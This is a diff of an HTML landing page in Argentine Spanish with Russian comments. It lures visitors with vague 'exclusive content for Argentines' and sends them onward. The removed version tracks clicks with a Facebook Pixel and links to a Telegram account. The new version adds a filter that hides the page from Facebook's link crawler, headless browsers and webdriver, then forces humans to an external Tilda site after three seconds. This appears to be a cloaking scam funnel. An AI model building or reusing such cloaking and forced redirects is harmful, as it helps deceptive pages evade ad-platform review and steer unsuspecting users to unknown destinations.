@@ -1,101 +1,91 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>¿Sos argentino de verdad?</title>
-  <meta property="og:title" content="¿Sos argentino de verdad?">
-  <meta property="og:description" content="Contenido exclusivo solo para argentinos">
-  <meta property="og:image" content="background.jpg">
-
-  <!-- Facebook Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '703244512292417');
-    fbq('track', 'PageView');
-  </script>
-  <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=703244512292417&ev=PageView&noscript=1"/></noscript>
-  <!-- End Facebook Pixel -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Argentina Hoy</title>
+  <meta property="og:title" content="Información exclusiva para argentinos">
+  <meta property="og:description" content="Acceso limitado para ciudadanos locales">
+  <meta property="og:image" content="https://yourdomain.github.io/background.jpg">
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body {
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
-      background: #f4f4f4;
-      overflow: hidden;
-    }
-    .container {
       background: url('background.jpg') no-repeat center center/cover;
-      height: 100vh;
+      overflow: hidden;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
+      flex-direction: column;
       text-align: center;
-      padding: 20px;
     }
+
     h1 {
-      font-size: 2.2rem;
-      font-weight: bold;
       color: white;
-      text-shadow: 2px 2px 4px rgba(0,0,0,0.6);
+      font-size: 2.5em;
+      text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
       margin-bottom: 15px;
     }
+
     p {
-      font-size: 1.1rem;
-      color: #fff;
-      text-shadow: 1px 1px 3px rgba(0,0,0,0.6);
-      margin-bottom: 25px;
+      color: white;
+      font-size: 1.2em;
+      margin-bottom: 30px;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.4);
     }
+
     .btn {
-      background-color: #ffcc00;
-      color: #000;
-      font-size: 1rem;
-      padding: 12px 24px;
+      padding: 14px 28px;
+      font-size: 1em;
+      background-color: white;
+      color: #004080;
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      transition: 0.3s;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
     }
+
     .btn:hover {
-      background-color: #ffd633;
-      transform: scale(1.05);
+      background-color: #f0f0f0;
+    }
+
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8em; }
+      p { font-size: 1em; }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>¡Comprobamos si sos argentino de verdad!</h1>
-    <p>Accedé al contenido exclusivo para los que tienen el mate en la sangre.</p>
-    <button class="btn" onclick="goToTelegram()">
-      INGRESAR
-    </button>
-  </div>
+  <h1>¿Sos argentino de verdad?</h1>
+  <p>Descubrí lo que no siempre se muestra. Acceso limitado solo para argentinos.</p>
+  <button class="btn" id="accederBtn">Acceder Ahora</button>
 
   <script>
-    // Антибот-защита (user-agent фильтр + webdriver)
-    const isBot = () => {
+    // Anti-bot simple
+    function isBot() {
       const ua = navigator.userAgent.toLowerCase();
-      const suspicious = [/bot/, /crawl/, /spider/, /crawling/];
-      return suspicious.some(rx => rx.test(ua)) || navigator.webdriver;
-    };
-
-    // Функция редиректа с пикселем
-    function goToTelegram() {
-      if (isBot()) return;
-      fbq('track', 'Lead');
-      setTimeout(() => {
-        window.location.href = "https://t.me/Veronica_especialista";
-      }, 300);
+      return navigator.webdriver ||
+             !navigator.languages ||
+             /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
     }
+
+    const redirectURL = "https://argentinaforreal.tilda.ws/";
+
+    document.getElementById("accederBtn").addEventListener("click", () => {
+      if (!isBot()) {
+        window.location.href = redirectURL;
+      }
+    });
+
+    // Авто-редирект через 3 секунды
+    setTimeout(() => {
+      if (!isBot()) {
+        window.location.href = redirectURL;
+      }
+    }, 3000);
   </script>
 </body>
 </html>
